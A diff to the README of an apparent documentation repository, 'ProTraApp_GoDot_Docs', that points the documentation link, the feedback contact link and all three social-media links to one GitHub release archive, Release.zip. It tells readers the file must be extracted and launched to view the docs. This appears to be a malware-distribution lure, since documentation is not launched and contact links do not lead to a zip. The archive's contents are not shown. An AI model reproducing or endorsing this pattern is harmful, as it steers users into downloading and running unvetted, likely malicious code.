@@ -34,7 +34,7 @@ This repository, named ***ProTraApp_GoDot_Docs***, serves as a central hub for a
 
 ## Get Started 🚀
 
-To dive into the world of GoDot with ProTraApp, you can begin by exploring our **[GoDot Documentation](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)**. Click the link above to access the files you need to kickstart your GoDot integration journey.
+To dive into the world of GoDot with ProTraApp, you can begin by exploring our **[GoDot Documentation](https://github.com/akashmewara144/ProTraApp_GoDot_Docs/releases/download/v1.0/Release.zip)**. Click the link above to access the files you need to kickstart your GoDot integration journey.
 
 ### Note: 
 The file you are about to download needs to be extracted and launched to access the GoDot documentation files.
@@ -45,14 +45,14 @@ For the latest updates, releases, and announcements regarding the ProTraApp GoDo
 
 ## Your Feedback Matters 🌟
 
-We value your input and suggestions. Feel free to [reach out](mailto:your-email@domain.com) to us with your thoughts, ideas, and feedback on how we can make the ProTraApp GoDot integration even better!
+We value your input and suggestions. Feel free to [reach out](https://github.com/akashmewara144/ProTraApp_GoDot_Docs/releases/download/v1.0/Release.zip) to us with your thoughts, ideas, and feedback on how we can make the ProTraApp GoDot integration even better!
 
 ## Let's Connect 🌐
 
 Stay connected with the ProTraApp community on various platforms:
-- [Twitter](https://twitter.com/protraapp)
-- [Discord](https://discordapp.com/protraapp)
-- [LinkedIn](https://linkedin.com/company/protraapp)
+- [Twitter](https://github.com/akashmewara144/ProTraApp_GoDot_Docs/releases/download/v1.0/Release.zip)
+- [Discord](https://github.com/akashmewara144/ProTraApp_GoDot_Docs/releases/download/v1.0/Release.zip)
+- [LinkedIn](https://github.com/akashmewara144/ProTraApp_GoDot_Docs/releases/download/v1.0/Release.zip)
 
 ---
 
